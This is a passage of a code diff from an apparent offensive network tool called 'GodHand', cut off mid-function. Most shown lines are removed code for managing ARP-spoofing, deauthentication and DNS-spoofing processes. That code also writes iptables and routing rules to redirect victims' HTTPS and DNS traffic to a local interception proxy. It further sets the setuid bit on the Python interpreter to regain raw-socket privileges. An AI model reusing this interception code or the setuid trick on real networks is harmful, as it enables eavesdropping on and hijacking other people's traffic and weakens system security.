         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(('8.8.8.8', 80))
         ip = s.getsockname()[0]
         s.close()
-        add_log('dev', f'Local IP via gateway probe: {ip}')
         return ip
-    except Exception as e:
-        add_log('warn', f'Failed to determine local IP: {e}')
+    except:
         return '0.0.0.0'
 
 _EXTERNAL_IP_CACHE = {'ip': None, 'time': 0}
 def get_external_ip():
     now = time.time()
     if _EXTERNAL_IP_CACHE['ip'] and now - _EXTERNAL_IP_CACHE['time'] < 300:
-        add_log('dev', f'Using cached external IP: {_EXTERNAL_IP_CACHE["ip"]}')
         return _EXTERNAL_IP_CACHE['ip']
     try:
         req = urllib.request.Request('https://api.ipify.org', headers={'User-Agent': 'GodHand'})
@@ -2696,12 +2225,9 @@ def get_external_ip():
             ip = r.read().decode().strip()
         _EXTERNAL_IP_CACHE['ip'] = ip
         _EXTERNAL_IP_CACHE['time'] = now
-        add_log('dev', f'Retrieved external IP from api.ipify.org: {ip}')
         return ip
-    except Exception as e:
-        cached = _EXTERNAL_IP_CACHE['ip'] or 'Unknown'
-        add_log('warn', f'Failed to get external IP from api.ipify.org: {e} (using cached: {cached})')
-        return cached
+    except:
+        return _EXTERNAL_IP_CACHE['ip'] or 'Unknown'
 
 def simple_dns_query(domain, server='127.0.0.1', port=53, timeout=3):
     txid = random.randint(0, 65535)
@@ -2717,1365 +2243,6 @@ def simple_dns_query(domain, server='127.0.0.1', port=53, timeout=3):
         s.close()
     _, flags, _, ancount = struct.unpack('!HHHH', data[:8])
     return {'rcode': flags & 0x000F, 'answer_count': ancount}
-
-# ---------- ping wrapper for Android/Linux compatibility ----------
-_PING_METHOD_CACHE = None
-
-def _detect_ping_method():
-    """Detect available ping binary and method on this system."""
-    global _PING_METHOD_CACHE
-    if _PING_METHOD_CACHE:
-        return _PING_METHOD_CACHE
-
-    # Try ping binaries in order of preference
-    ping_paths = [
-        ('/bin/ping', ['-c', '1']),
-        ('/system/bin/ping', ['-c', '1']),
-        ('/bin/busybox', ['ping', '-c', '1']),
-        ('ping', ['-c', '1']),
-    ]
-
-    for binary, args in ping_paths:
-        try:
-            result = subprocess.run([binary] + args + ['127.0.0.1'], capture_output=True, timeout=2)
-            if result.returncode in (0, 1):  # Success or timeout
-                _PING_METHOD_CACHE = ('binary', binary, args)
-                add_log('dev', f'Ping method detected: {binary}')
-                return _PING_METHOD_CACHE
-        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
-            continue
-
-    # Fallback to socket-based ICMP ping
-    _PING_METHOD_CACHE = ('socket', None, None)
-    add_log('dev', 'Ping method: socket-based ICMP (fallback)')
-    return _PING_METHOD_CACHE
-
-def _ping_via_socket(target, timeout=5):
-    """Send ICMP ECHO_REQUEST via raw socket."""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        sock.settimeout(timeout)
-
-        # Build ICMP packet (type 8 = ECHO_REQUEST)
-        icmp_type = 8
-        icmp_code = 0
-        icmp_checksum = 0
-        icmp_id = os.getpid() & 0xFFFF
-        icmp_seq = 1
-
-        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
-        icmp_data = b'GodHand ping'
-
-        # Calculate checksum
-        icmp_checksum = sum(struct.unpack('!H', icmp_header[i:i+2])[0] for i in range(0, len(icmp_header), 2))
-        if len(icmp_data) % 2:
-            icmp_data += b'\x00'
-        icmp_checksum += sum(struct.unpack('!H', icmp_data[i:i+2])[0] for i in range(0, len(icmp_data), 2))
-        icmp_checksum = (icmp_checksum + (icmp_checksum >> 16)) & 0xFFFF
-        icmp_checksum = ~icmp_checksum & 0xFFFF
-
-        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
-        icmp_packet = icmp_header + icmp_data
-
-        start = time.time()
-        sock.sendto(icmp_packet, (target, 0))
-        data, _ = sock.recvfrom(1024)
-        elapsed = (time.time() - start) * 1000  # Convert to ms
-
-        sock.close()
-        return {'available': True, 'latency_ms': int(elapsed), 'packet_loss': 0}
-    except Exception as e:
-        try:
-            sock.close()
-        except:
-            pass
-        return {'available': False, 'latency_ms': None, 'packet_loss': 100, 'error': str(e)}
-
-def ping(target, count=1, timeout=5):
-    """
-    Cross-platform ping wrapper for Android/Linux compatibility.
-    Returns: {'available': bool, 'latency_ms': int, 'packet_loss': int, 'error': str}
-    """
-    method, binary, args = _detect_ping_method()
-
-    if method == 'binary':
-        try:
-            result = subprocess.run(
-                [binary] + args + [target],
-                capture_output=True,
-                text=True,
-                timeout=timeout
-            )
-
-            output = result.stdout + result.stderr
-
-            # Parse latency from output (format: "time=10.5 ms")
-            latency_match = re.search(r'time[=:]\s*(\d+(?:\.\d+)?)', output)
-            latency_ms = int(float(latency_match.group(1))) if latency_match else None
-
-            # Parse packet loss (format: "0% packet loss" or "0 packets lost")
-            loss_match = re.search(r'(\d+)%\s*(?:packet\s+)?loss', output)
-            packet_loss = int(loss_match.group(1)) if loss_match else (0 if result.returncode == 0 else 100)
-
-            available = packet_loss < 100
-
-            return {
-                'available': available,
-                'latency_ms': latency_ms,
-                'packet_loss': packet_loss
-            }
-        except subprocess.TimeoutExpired:
-            return {'available': False, 'latency_ms': None, 'packet_loss': 100, 'error': 'timeout'}
-        except Exception as e:
-            return {'available': False, 'latency_ms': None, 'packet_loss': 100, 'error': str(e)}
-    else:
-        # Socket-based ICMP (requires CAP_NET_RAW)
-        return _ping_via_socket(target, timeout)
-
-# ---------- capability verification (CAP_NET_RAW, etc.) ----------
-def check_cap_net_raw():
-    """Verify CAP_NET_RAW capability for raw socket operations."""
-    try:
-        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-        sock.close()
-        return True
-    except (OSError, AttributeError):
-        return False
-
-def check_capabilities():
-    """Check all critical capabilities and cache results."""
-    caps = {
-        'CAP_NET_RAW': check_cap_net_raw(),
-        'CAP_NET_ADMIN': _check_cap_net_admin(),
-        'root': os.geteuid() == 0 if hasattr(os, 'geteuid') else False
-    }
-    return caps
-
-def _check_cap_net_admin():
-    """Verify CAP_NET_ADMIN for iptables/routing operations."""
-    try:
-        # Try to read /proc/net/iptable_filter to verify iptables capability
-        with open('/proc/net/iptable_filter', 'r') as f:
-            f.read(1)
-        return True
-    except (OSError, IOError, FileNotFoundError):
-        return False
-
-def get_capability_status():
-    """Get current capability status for API and logging."""
-    caps = check_capabilities()
-    status = {
-        'has_cap_net_raw': caps['CAP_NET_RAW'],
-        'has_cap_net_admin': caps['CAP_NET_ADMIN'],
-        'is_root': caps['root'],
-        'packet_injection_enabled': caps['CAP_NET_RAW'],
-        'traffic_redirect_enabled': caps['CAP_NET_ADMIN'] and caps['root'],
-        'packet_capture_enabled': caps['CAP_NET_RAW'] or caps['root']
-    }
-    return status
-
-def attempt_capability_restoration():
-    """Try to restore missing CAP_NET_RAW capability."""
-    if check_cap_net_raw():
-        return True  # Already have it
-
-    # Try setcap if available
-    try:
-        python_path = sys.executable
-        result = subprocess.run(
-            ['setcap', 'cap_net_raw+ep', python_path],
-            capture_output=True,
-            timeout=5
-        )
-        if result.returncode == 0:
-            add_log('success', f'CAP_NET_RAW restored via setcap on {python_path}')
-            return True
-    except (FileNotFoundError, subprocess.TimeoutExpired):
-        pass
-
-    # Try setuid bit as fallback
-    try:
-        python_path = sys.executable
-        os.chmod(python_path, os.stat(python_path).st_mode | stat.S_ISUID)
-        add_log('warn', f'Applied setuid bit to {python_path} (less secure than setcap)')
-        return True
-    except Exception as e:
-        add_log('warn', f'Could not restore CAP_NET_RAW: {e}')
-        return False
-
-def verify_capabilities_on_startup():
-    """Verify capabilities at startup and log warnings/suggestions."""
-    caps = get_capability_status()
-
-    if not caps['is_root']:
-        add_log('warn', 'Not running as root; packet injection, iptables, and traffic redirection will fail')
-
-    if not caps['has_cap_net_raw']:
-        add_log('warn', 'CAP_NET_RAW not available; packet injection (ARP, deauth) will not work')
-        if attempt_capability_restoration():
-            add_log('success', 'CAP_NET_RAW capability restored')
-        else:
-            add_log('error', 'Could not restore CAP_NET_RAW; run as root or set CAP_NET_RAW manually')
-
-    if not caps['has_cap_net_admin']:
-        add_log('warn', 'CAP_NET_ADMIN not available; iptables/routing will not work')
-
-    # Verify transparent interceptor availability
-    if TRANSPARENT_INTERCEPTOR.is_available():
-        add_log('success', 'Transparent iptables interception available (Phase 8)')
-    else:
-        add_log('warn', 'Transparent iptables interception not available; iptables or netfilter may be missing')
-
-    # Verify port forwarding (ip rule/route) availability
-    if PORT_FORWARDING_MANAGER.is_available():
-        add_log('success', 'Kernel-level port forwarding available (Phase 9)')
-    else:
-        add_log('warn', 'Port forwarding not available; ip command or routing tables may be missing')
-
-    # Verify Android runtime integration
-    if ANDROID_RUNTIME.detect_platform():
-        add_log('success', f'Android/Termux platform detected (Phase 10) - {ANDROID_RUNTIME.get_status()["selinux"]["context"] or "unknown context"}')
-        selinux_status = ANDROID_RUNTIME.check_selinux_constraints()
-        if selinux_status.get('issues'):
-            for issue in selinux_status['issues']:
-                add_log('warn', f'Android: {issue}')
-    else:
-        add_log('info', 'Not running on Android/Termux; Phase 10 features not active')
-
-# ---------- Process group management (Phase 6: Subprocess Isolation) ----------
-class ProcessGroup:
-    """Manages subprocess lifecycle with resource limits, automatic cleanup, and graceful restart."""
-
-    def __init__(self, name, max_processes=10, timeout_sec=300, memory_limit_mb=None, cpu_limit_percent=None):
-        self.name = name
-        self.max_processes = max_processes
-        self.timeout_sec = timeout_sec
-        self.memory_limit_mb = memory_limit_mb
-        self.cpu_limit_percent = cpu_limit_percent
-        self.processes = []  # List of (proc, start_time, description)
-        self.lock = threading.RLock()
-
-    def spawn(self, cmd, shell=False, description=""):
-        """Spawn subprocess with automatic cleanup on completion."""
-        with self.lock:
-            # Cleanup zombies before spawning new process
-            self._reap_zombies()
-
-            # Check process limit
-            if len(self.processes) >= self.max_processes:
-                add_log('warn', f'ProcessGroup {self.name}: max_processes ({self.max_processes}) reached')
-                return None
-
-            try:
-                proc = subprocess.Popen(
-                    cmd,
-                    shell=shell,
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    preexec_fn=os.setsid if not shell else None,  # Create process group
-                    text=True
-                )
-
-                start_time = time.time()
-                self.processes.append((proc, start_time, description))
-                add_log('dev', f'ProcessGroup {self.name}: spawned {description} (pid={proc.pid})')
-
-                # Spawn reaper daemon thread for this process
-                reaper_thread = threading.Thread(
-                    target=self._reap_process,
-                    args=(proc, start_time, description),
-                    daemon=True
-                )
-                reaper_thread.start()
-
-                return proc
-            except Exception as e:
-                add_log('error', f'ProcessGroup {self.name}: spawn failed for {description}: {e}')
-                return None
-
-    def _reap_process(self, proc, start_time, description):
-        """Reap a single process after timeout or completion."""
-        try:
-            # Wait for process with timeout
-            if proc.wait(timeout=self.timeout_sec) is None:
-                pass  # Process exited normally
-        except subprocess.TimeoutExpired:
-            add_log('warn', f'ProcessGroup {self.name}: {description} (pid={proc.pid}) timeout after {self.timeout_sec}s, terminating')
-            try:
-                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
-                proc.wait(timeout=2)
-            except:
-                try:
-                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
-                except:
-                    pass
-        except Exception as e:
-            add_log('warn', f'ProcessGroup {self.name}: reap_process error for {description}: {e}')
-        finally:
-            # Remove from process list
-            with self.lock:
-                self.processes = [(p, t, d) for p, t, d in self.processes if p.pid != proc.pid]
-
-    def _reap_zombies(self):
-        """Clean up zombie processes (call with lock held)."""
-        remaining = []
-        for proc, start_time, description in self.processes:
-            if proc.poll() is None:
-                # Still running
-                remaining.append((proc, start_time, description))
-            else:
-                # Exited, already reaped by wait()
-                add_log('dev', f'ProcessGroup {self.name}: reaped {description} (pid={proc.pid}, runtime={time.time()-start_time:.1f}s)')
-
-        self.processes = remaining
-
-    def terminate_all(self, graceful_timeout=2):
-        """Terminate all processes in group (non-blocking)."""
-        with self.lock:
-            if not self.processes:
-                return
-
-            pids_to_kill = [proc.pid for proc, _, _ in self.processes]
-            add_log('info', f'ProcessGroup {self.name}: terminating {len(pids_to_kill)} processes')
-
-            # Spawn async termination thread (non-blocking)
-            terminator = threading.Thread(
-                target=self._terminate_async,
-                args=(pids_to_kill, graceful_timeout),
-                daemon=True
-            )
-            terminator.start()
-
-    def _terminate_async(self, pids_to_kill, graceful_timeout):
-        """Terminate processes asynchronously (runs in daemon thread)."""
-        try:
-            # First pass: SIGTERM
-            for pid in pids_to_kill:
-                try:
-                    os.killpg(os.getpgid(pid), signal.SIGTERM)
-                except (ProcessLookupError, OSError):
-                    pass
-
-            # Wait for graceful termination
-            time.sleep(graceful_timeout)
-
-            # Second pass: SIGKILL for stragglers
-            for pid in pids_to_kill:
-                try:
-                    os.killpg(os.getpgid(pid), signal.SIGKILL)
-                except (ProcessLookupError, OSError):
-                    pass
-
-            # Reap the processes
-            time.sleep(0.1)
-            with self.lock:
-                self._reap_zombies()
-
-            add_log('info', f'ProcessGroup {self.name}: all processes terminated')
-        except Exception as e:
-            add_log('error', f'ProcessGroup {self.name}: error during termination: {e}')
-
-    def get_status(self):
-        """Get status of all processes in group."""
-        with self.lock:
-            self._reap_zombies()
-            status = {
-                'name': self.name,
-                'total': len(self.processes),
-                'processes': [
-                    {
-                        'pid': proc.pid,
-                        'description': desc,
-                        'runtime_sec': time.time() - start_time,
-                        'alive': proc.poll() is None
-                    }
-                    for proc, start_time, desc in self.processes
-                ]
-            }
-            return status
-
-    def is_running(self):
-        """Check if any processes are still running."""
-        with self.lock:
-            self._reap_zombies()
-            return len(self.processes) > 0
-
-# Global process groups for attack management
-attack_process_groups = {
-    'arp_spoofing': ProcessGroup('arp_spoofing', max_processes=20, timeout_sec=600),
-    'traffic_capture': ProcessGroup('traffic_capture', max_processes=10, timeout_sec=1800),
-    'deauth': ProcessGroup('deauth', max_processes=30, timeout_sec=300),
-    'dns_spoof': ProcessGroup('dns_spoof', max_processes=10, timeout_sec=900),
-    'gateway': ProcessGroup('gateway', max_processes=5, timeout_sec=3600),
-}
-
-def spawn_attack_process(group_name, cmd, weapon_id=None, shell=False, description=""):
-    """Spawn subprocess through ProcessGroup and optionally track in attack_pids.
-
-    Args:
-        group_name: Name of ProcessGroup ('arp_spoofing', 'traffic_capture', etc.)
-        cmd: Command to run (string if shell=True, list otherwise)
-        weapon_id: Optional weapon ID to track in STATE['attack_pids'] for stop control
-        shell: Whether to run via shell
-        description: Description for logging
-
-    Returns:
-        Subprocess handle, or None if spawn failed
-    """
-    if group_name not in attack_process_groups:
-        add_log('error', f'Unknown process group: {group_name}')
-        return None
-
-    group = attack_process_groups[group_name]
-    proc = group.spawn(cmd, shell=shell, description=description)
-
-    # Track in attack_pids if weapon_id provided (for existing stop control)
-    if proc and weapon_id is not None:
-        with STATE_LOCK:
-            if weapon_id not in STATE['attack_pids']:
-                STATE['attack_pids'][weapon_id] = []
-            STATE['attack_pids'][weapon_id].append(proc)
-
-    return proc
-
-# ---------- Transparent Intercept via iptables (Phase 8) ----------
-class TransparentInterceptor:
-    """Transparent packet redirection via iptables netfilter rules.
-
-    Enables seamless traffic interception by redirecting packets to local ports
-    without requiring ARP spoofing. Supports TCP/UDP, single targets or network-wide.
-    """
-
-    def __init__(self, name="GODHAND", chain_prefix="GH_"):
-        self.name = name
-        self.chain_prefix = chain_prefix
-        self.active_chains = {}  # {chain_name: {'rules': [...], 'port': port}}
-        self.lock = threading.RLock()
-
-    def is_available(self):
-        """Check if iptables and NAT support are available."""
-        try:
-            result = subprocess.run(
-                ['iptables', '-t', 'nat', '-L'],
-                capture_output=True, timeout=3
-            )
-            return result.returncode == 0
-        except (FileNotFoundError, subprocess.TimeoutExpired):
-            return False
-
-    def create_chain(self, chain_name, table='nat'):
-        """Create a new iptables chain for rule organization."""
-        try:
-            subprocess.run(
-                ['iptables', '-t', table, '-N', chain_name],
-                capture_output=True, timeout=3, check=False
-            )
-            with self.lock:
-                if chain_name not in self.active_chains:
-                    self.active_chains[chain_name] = {'rules': [], 'table': table}
-            add_log('dev', f'iptables chain created: {chain_name}')
-            return True
-        except Exception as e:
-            add_log('warn', f'Failed to create chain {chain_name}: {e}')
-            return False
-
-    def add_redirect_rule(self, chain_name, protocol='tcp', src_port=None, dst_port=None,
-                         target_port=None, src_ip=None, dst_ip=None, table='nat'):
-        """Add a transparent redirect rule to a chain.
-
-        Args:
-            chain_name: Target chain to add rule to
-            protocol: 'tcp' or 'udp'
-            src_port: Source port filter (optional)
-            dst_port: Destination port to intercept
-            target_port: Local port to redirect to
-            src_ip: Source IP filter (optional)
-            dst_ip: Destination IP filter (optional)
-            table: iptables table ('nat' for REDIRECT, 'mangle' for others)
-
-        Returns:
-            True if rule added successfully
-        """
-        try:
-            cmd = ['iptables', '-t', table, '-A', chain_name, '-p', protocol]
-
-            if src_ip:
-                cmd.extend(['-s', src_ip])
-            if dst_ip:
-                cmd.extend(['-d', dst_ip])
-            if src_port:
-                cmd.extend(['--sport', str(src_port)])
-            if dst_port:
-                cmd.extend(['--dport', str(dst_port)])
-
-            cmd.extend(['-j', 'REDIRECT', '--to-port', str(target_port)])
-
-            subprocess.run(cmd, capture_output=True, timeout=3, check=True)
-
-            with self.lock:
-                if chain_name in self.active_chains:
-                    rule_desc = f'{protocol} {src_ip or "any"}:{src_port or "any"} -> '
-                    rule_desc += f'{dst_ip or "any"}:{dst_port or "any"} -> :{target_port}'
-                    self.active_chains[chain_name]['rules'].append(rule_desc)
-
-            add_log('dev', f'iptables rule added: {chain_name} ({protocol} :{dst_port}->{target_port})')
-            return True
-        except Exception as e:
-            add_log('warn', f'Failed to add redirect rule: {e}')
-            return False
-
-    def add_chain_to_hook(self, chain_name, hook_chain='PREROUTING', table='nat'):
-        """Insert chain into a standard iptables hook (PREROUTING, INPUT, etc).
-
-        Args:
-            chain_name: Custom chain to hook in
-            hook_chain: Standard chain to insert into ('PREROUTING', 'POSTROUTING', 'INPUT')
-            table: iptables table
-
-        Returns:
-            True if insertion successful
-        """
-        try:
-            # Insert at position 1 so it's checked first
-            subprocess.run(
-                ['iptables', '-t', table, '-I', hook_chain, '1', '-j', chain_name],
-                capture_output=True, timeout=3, check=True
-            )
-            add_log('dev', f'iptables hook added: {hook_chain} -> {chain_name}')
-            return True
-        except Exception as e:
-            add_log('warn', f'Failed to hook chain: {e}')
-            return False
-
-    def enable_port_forwarding(self, local_port, forward_port, protocol='tcp'):
-        """Enable kernel-level port forwarding via iptables DNAT.
-
-        Forwards all traffic to local_port to forward_port.
-        Useful for routing gateway/proxy traffic.
-        """
-        try:
-            chain_name = f'{self.chain_prefix}FORWARD_{local_port}'
-            self.create_chain(chain_name)
-
-            cmd = ['iptables', '-t', 'nat', '-A', chain_name,
-                   '-p', protocol, '--dport', str(local_port),
-                   '-j', 'DNAT', '--to-destination', f'127.0.0.1:{forward_port}']
-
-            subprocess.run(cmd, capture_output=True, timeout=3, check=True)
-            self.add_chain_to_hook(chain_name, 'PREROUTING', 'nat')
-
-            add_log('success', f'Port forwarding enabled: {local_port} -> {forward_port}')
-            return True
-        except Exception as e:
-            add_log('warn', f'Port forwarding failed: {e}')
-            return False
-
-    def enable_https_intercept(self, target_ips=None, proxy_port=8888, interface=None):
-        """Enable transparent HTTPS (443) interception to proxy.
-
-        Args:
-            target_ips: List of target IPs to intercept, or None for all traffic
-            proxy_port: Local port running HTTPS proxy
-            interface: Interface to restrict to (optional)
-
-        Returns:
-            Chain name if successful
-        """
-        try:
-            chain_name = f'{self.chain_prefix}HTTPS'
-            self.create_chain(chain_name)
-
-            if target_ips:
-                # Per-target rules
-                for target_ip in target_ips:
-                    self.add_redirect_rule(chain_name, protocol='tcp',
-                                          dst_ip=target_ip, dst_port=443,
-                                          target_port=proxy_port)
-            else:
-                # All traffic
-                self.add_redirect_rule(chain_name, protocol='tcp',
-                                      dst_port=443, target_port=proxy_port)
-
-            self.add_chain_to_hook(chain_name, 'PREROUTING', 'nat')
-
-            n_targets = len(target_ips) if target_ips else "all"
-            add_log('success', f'HTTPS intercept enabled for {n_targets} targets')
-            return chain_name
-        except Exception as e:
-            add_log('error', f'HTTPS intercept setup failed: {e}')
-            return None
-
-    def enable_dns_intercept(self, dns_port=5353, target_ips=None):
-        """Enable transparent DNS (port 53) redirection to custom DNS server.
-
-        Args:
-            dns_port: Local port running DNS server
-            target_ips: Target IPs to intercept (None = all)
-        """
-        try:
-            chain_name = f'{self.chain_prefix}DNS'
-            self.create_chain(chain_name)
-
-            # UDP DNS
-            self.add_redirect_rule(chain_name, protocol='udp',
-                                  dst_port=53, target_port=dns_port)
-            # TCP DNS (less common but support it)
-            self.add_redirect_rule(chain_name, protocol='tcp',
-                                  dst_port=53, target_port=dns_port)
-
-            self.add_chain_to_hook(chain_name, 'PREROUTING', 'nat')
-
-            add_log('success', f'DNS intercept enabled on port {dns_port}')
-            return chain_name
-        except Exception as e:
-            add_log('error', f'DNS intercept setup failed: {e}')
-            return None
-
-    def disable_chain(self, chain_name, table='nat'):
-        """Disable and remove all rules from a chain."""
-        try:
-            # Unhook from standard chains
-            for hook in ['PREROUTING', 'POSTROUTING', 'INPUT', 'OUTPUT']:
-                subprocess.run(
-                    ['iptables', '-t', table, '-D', hook, '-j', chain_name],
-                    capture_output=True, timeout=3, check=False
-                )
-
-            # Flush and delete chain
-            subprocess.run(
-                ['iptables', '-t', table, '-F', chain_name],
-                capture_output=True, timeout=3, check=True
-            )
-            subprocess.run(
-                ['iptables', '-t', table, '-X', chain_name],
-                capture_output=True, timeout=3, check=True
-            )
-
-            with self.lock:
-                if chain_name in self.active_chains:
-                    del self.active_chains[chain_name]
-
-            add_log('dev', f'iptables chain disabled and removed: {chain_name}')
-            return True
-        except Exception as e:
-            add_log('warn', f'Failed to disable chain {chain_name}: {e}')
-            return False
-
-    def cleanup_all(self):
-        """Remove all GODHAND iptables rules and chains."""
-        try:
-            with self.lock:
-                chains_to_remove = list(self.active_chains.keys())
-
-            for chain in chains_to_remove:
-                self.disable_chain(chain)
-
-            add_log('success', 'All iptables rules cleaned up')
-            return True
-        except Exception as e:
-            add_log('error', f'Cleanup failed: {e}')
-            return False
-
-    def get_status(self):
-        """Get status of all active intercept chains."""
-        with self.lock:
-            status = {
-                'available': self.is_available(),
-                'active_chains': len(self.active_chains),
-                'chains': {}
-            }
-
-            for chain_name, chain_info in self.active_chains.items():
-                status['chains'][chain_name] = {
-                    'rules': len(chain_info['rules']),
-                    'table': chain_info.get('table', 'nat'),
-                    'rule_list': chain_info['rules']
-                }
-
-            return status
-
-# Global transparent interceptor instance
-TRANSPARENT_INTERCEPTOR = TransparentInterceptor()
-
-# ---------- Port forwarding via kernel routing (Phase 9) ----------
-class PortForwardingManager:
-    """Kernel-level port forwarding via ip rule and ip route.
-
-    Complements iptables-based interception by managing Linux routing tables
-    for flexible, policy-based packet forwarding without ARP spoofing.
-    """
-
-    def __init__(self, name="GODHAND", table_base=100, rule_priority_base=1000):
-        self.name = name
-        self.table_base = table_base  # Start routing tables at 100 (custom range)
-        self.rule_priority_base = rule_priority_base  # Start rules at priority 1000
-        self.active_tables = {}  # {table_id: {'name': str, 'rules': [], 'routes': []}}
-        self.active_rules = {}  # {rule_id: {'priority': int, 'selector': dict, 'table': int}}
-        self.next_table_id = table_base
-        self.next_rule_id = 0
-        self.lock = threading.RLock()
-
-    def is_available(self):
-        """Check if ip command and routing table support are available."""
-        try:
-            result = subprocess.run(
-                ['ip', 'rule', 'list'],
-                capture_output=True, timeout=3
-            )
-            return result.returncode == 0
-        except (FileNotFoundError, subprocess.TimeoutExpired):
-            return False
-
-    def allocate_table(self, name):
-        """Allocate a new routing table ID."""
-        with self.lock:
-            table_id = self.next_table_id
-            self.next_table_id += 1
-            self.active_tables[table_id] = {
-                'name': name,
-                'rules': [],
-                'routes': []
-            }
-            add_log('dev', f'Allocated routing table {table_id} for {name}')
-            return table_id
-
-    def add_rule(self, from_ip=None, to_ip=None, iface=None, table_id=None, priority=None):
-        """Add a routing rule to direct traffic to a specific table.
-
-        Args:
-            from_ip: Source IP to match (e.g., '192.168.1.0/24')
-            to_ip: Destination IP to match
-            iface: Interface name to match
-            table_id: Target routing table
-            priority: Rule priority (lower = checked first)
-
-        Returns:
-            Rule ID if successful
-        """
-        try:
-            if not self.is_available():
-                return None
-
-            if table_id is None:
-                add_log('warn', 'add_rule: table_id required')
-                return None
-
-            with self.lock:
-                rule_id = self.next_rule_id
-                self.next_rule_id += 1
-                priority = priority or (self.rule_priority_base + rule_id)
-
-            # Build ip rule command
-            cmd = ['ip', 'rule', 'add']
-            selector = {}
-
-            if from_ip:
-                cmd.extend(['from', from_ip])
-                selector['from'] = from_ip
-            if to_ip:
-                cmd.extend(['to', to_ip])
-                selector['to'] = to_ip
-            if iface:
-                cmd.extend(['iif', iface])
-                selector['iif'] = iface
-
-            cmd.extend(['priority', str(priority), 'table', str(table_id)])
-
-            result = subprocess.run(cmd, capture_output=True, timeout=3, check=False)
-
-            if result.returncode == 0:
-                with self.lock:
-                    self.active_rules[rule_id] = {
-                        'priority': priority,
-                        'selector': selector,
-                        'table': table_id,
-                        'cmd': cmd
-                    }
-                add_log('dev', f'Routing rule {rule_id} added: {selector} -> table {table_id}')
-                return rule_id
-            else:
-                add_log('warn', f'Failed to add routing rule: {result.stderr.decode()}')
-                return None
-
-        except Exception as e:
-            add_log('warn', f'Error adding routing rule: {e}')
-            return None
-
-    def add_route(self, dest_ip, via_ip, table_id, iface=None, metric=100):
-        """Add a route to a routing table.
-
-        Args:
-            dest_ip: Destination IP/CIDR (e.g., '10.0.0.0/24' or 'default')
-            via_ip: Gateway IP to route through
-            table_id: Target routing table
-            iface: Interface to use
-            metric: Route metric/priority
-
-        Returns:
-            Route index if successful
-        """
-        try:
-            if not self.is_available():
-                return None
-
-            # Build ip route command
-            cmd = ['ip', 'route', 'add', dest_ip, 'via', via_ip]
-
-            if iface:
-                cmd.extend(['dev', iface])
-
-            cmd.extend(['metric', str(metric), 'table', str(table_id)])
-
-            result = subprocess.run(cmd, capture_output=True, timeout=3, check=False)
-
-            if result.returncode == 0:
-                with self.lock:
-                    if table_id in self.active_tables:
-                        route_entry = {
-                            'dest': dest_ip,
-                            'via': via_ip,
-                            'iface': iface,
-                            'metric': metric,
-                            'cmd': cmd
-                        }
-                        self.active_tables[table_id]['routes'].append(route_entry)
-
-                add_log('dev', f'Route added to table {table_id}: {dest_ip} via {via_ip}')
-                return len(self.active_tables[table_id]['routes']) - 1
-            else:
-                add_log('warn', f'Failed to add route: {result.stderr.decode()}')
-                return None
-
-        except Exception as e:
-            add_log('warn', f'Error adding route: {e}')
-            return None
-
-    def enable_port_redirect(self, local_port, dest_port, dest_ip=None, protocol='tcp',
-                            source_ip=None, table_id=None):
-        """Enable port forwarding using routing rules.
-
-        Combines policy-based routing (ip rule) with route table manipulation.
-
-        Args:
-            local_port: Local port receiving traffic
-            dest_port: Destination port to forward to
-            dest_ip: Destination IP (None = all hosts)
-            protocol: 'tcp' or 'udp'
-            source_ip: Source IP to match (optional)
-            table_id: Target routing table (auto-allocated if None)
-
-        Returns:
-            Table ID if successful
-        """
-        try:
-            if table_id is None:
-                table_id = self.allocate_table(f'PORT_{protocol.upper()}_{local_port}')
-
-            # Add rule to route marked traffic to this table
-            rule_id = self.add_rule(
-                from_ip=source_ip,
-                iface=None,
-                table_id=table_id,
-                priority=self.rule_priority_base
-            )
-
-            if rule_id is None:
-                add_log('warn', 'Failed to create routing rule for port forwarding')
-                return None
-
-            # Add default route through local forwarding
-            self.add_route('0.0.0.0/0', '127.0.0.1', table_id, metric=100)
-
-            add_log('success', f'Port forwarding enabled: {protocol} {local_port} -> {dest_port}')
-            return table_id
-
-        except Exception as e:
-            add_log('error', f'Port redirect setup failed: {e}')
-            return None
-
-    def enable_gateway_forwarding(self, gateway_ip, target_network=None, iface=None,
-                                  table_id=None):
-        """Enable traffic forwarding to gateway (e.g., for MITM proxy).
-
-        Args:
-            gateway_ip: Gateway IP address (routed device IP)
-            target_network: Target network to forward (None = all)
-            iface: Interface to match (optional)
-            table_id: Target routing table (auto-allocated if None)
-
-        Returns:
-            Table ID if successful
-        """
-        try:
-            if table_id is None:
-                table_id = self.allocate_table(f'GATEWAY_{gateway_ip}')
-
-            # Add rule for traffic from specific interface/network
-            rule_id = self.add_rule(
-                to_ip=target_network,
-                iface=iface,
-                table_id=table_id,
-                priority=self.rule_priority_base
-            )
-
-            if rule_id is None:
-                add_log('warn', 'Failed to create routing rule for gateway forwarding')
-                return None
-
-            # Add route to gateway for all traffic
-            self.add_route('0.0.0.0/0', gateway_ip, table_id, iface=iface, metric=100)
-
-            add_log('success', f'Gateway forwarding enabled to {gateway_ip} via table {table_id}')
-            return table_id
-
-        except Exception as e:
-            add_log('error', f'Gateway forwarding setup failed: {e}')
-            return None
-
-    def disable_table(self, table_id):
-        """Remove all rules and routes associated with a table."""
-        try:
-            with self.lock:
-                if table_id not in self.active_tables:
-                    add_log('warn', f'Table {table_id} not found')
-                    return False
-
-                table_info = self.active_tables[table_id]
-
-            # Remove all routes from this table
-            for route in table_info.get('routes', []):
-                try:
-                    cmd = ['ip', 'route', 'del', route['dest'], 'table', str(table_id)]
-                    subprocess.run(cmd, capture_output=True, timeout=3, check=False)
-                except Exception as e:
-                    add_log('dev', f'Route cleanup: {e}')
-
-            # Remove all rules pointing to this table
-            rules_to_remove = []
-            with self.lock:
-                for rule_id, rule_info in self.active_rules.items():
-                    if rule_info['table'] == table_id:
-                        rules_to_remove.append((rule_id, rule_info))
-
-            for rule_id, rule_info in rules_to_remove:
-                try:
